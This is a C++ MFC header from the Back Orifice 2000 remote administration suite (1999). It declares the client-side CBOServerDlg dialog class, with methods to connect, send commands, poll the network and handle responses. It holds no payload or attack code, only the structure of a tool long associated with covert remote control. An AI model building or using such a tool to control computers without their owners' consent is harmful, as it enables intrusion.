/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#if !defined(AFX_BOSERVERDLG_H__382F75C2_A9A8_11D2_ADC4_0000F8084273__INCLUDED_)
#define AFX_BOSERVERDLG_H__382F75C2_A9A8_11D2_ADC4_0000F8084273__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// BOServerDlg.h : header file
//

#include"BOCmdDescList.h"
#include"GradientDialog.h"
#include"BOWDoc.h"
#include"HistoryEdit.h"
#include"auth.h"

/////////////////////////////////////////////////////////////////////////////
// CBOServerDlg dialog

class CBOServerDlg : public CGradientDialog
{
// Construction
public:
	CBOServerDlg(CWnd* pParent = NULL);   // standard constructor
	~CBOServerDlg();
	void UseGradient(BOOL bGrad);
	void SetServerInfo(SERVER_INFO *si);
	void UpdateDialog(void);
	void HandleNetworkPoll(void);
	void HandleCommandResponse(char *svArg2);
	int PerformQuery();	

	friend UINT ServerListenThread(LPVOID pParam);


// Dialog Data
	//{{AFX_DATA(CBOServerDlg)
	enum { IDD = IDD_BOSERVERDLG };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

	BOOL			m_bHandleNetwork;
	BOOL			m_bIsConnected;
	CHistoryEdit	m_HistEdit;
	CFont			m_HistFont;


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBOServerDlg)
	public:
	virtual BOOL DestroyWindow();
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void OnOK();
	virtual void OnCancel();
	//}}AFX_VIRTUAL

// Implementation
protected:
	COLORREF		m_c1,m_c2;
	BOOL			m_bGrad,m_bGenerated;
	CBitmap			m_bmConnect;
	CImageList		m_TreeImageList;
	CBOCmdDescList	m_CmdDescList;
	SERVER_INFO		m_ServerInfo;
	CAuthSocket		*m_pAuthSocket;
	CWinThread		*m_cwtListenThread;
	CRITICAL_SECTION m_NetCritSec;
	
	// Generated message map functions
	//{{AFX_MSG(CBOServerDlg)
	afx_msg void OnAllowDocking();
	virtual BOOL OnInitDialog();
	afx_msg void OnConnectcheck();
	afx_msg void OnSelchangedServercommands(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSendcommand();
	afx_msg void OnClearResponses();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnSettings();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BOSERVERDLG_H__382F75C2_A9A8_11D2_ADC4_0000F8084273__INCLUDED_)
